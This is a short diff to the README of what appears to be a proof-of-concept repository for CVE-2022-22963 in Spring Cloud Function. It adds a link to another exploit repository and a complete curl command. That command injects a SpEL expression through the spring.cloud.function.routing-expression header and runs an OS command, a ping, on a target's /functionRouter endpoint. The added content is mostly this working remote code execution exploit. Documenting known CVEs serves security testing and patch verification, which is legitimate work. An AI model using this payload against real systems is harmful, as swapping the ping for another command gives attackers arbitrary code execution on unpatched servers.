@@ -5,7 +5,13 @@
 #
 https://spring.io/security/cve-2022-22963
 #
+https://github.com/kh4sh3i/Spring-CVE
+#
 ##
+
+```
+$ curl -i -s -k -X $'POST' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"ping -c5 172.17.0.1\")' -H $'Content-Type: application/x-www-form-urlencoded' $'http://172.17.0.2:8080/functionRouter'
+```
 
 
 # spring-spel-0day-poc
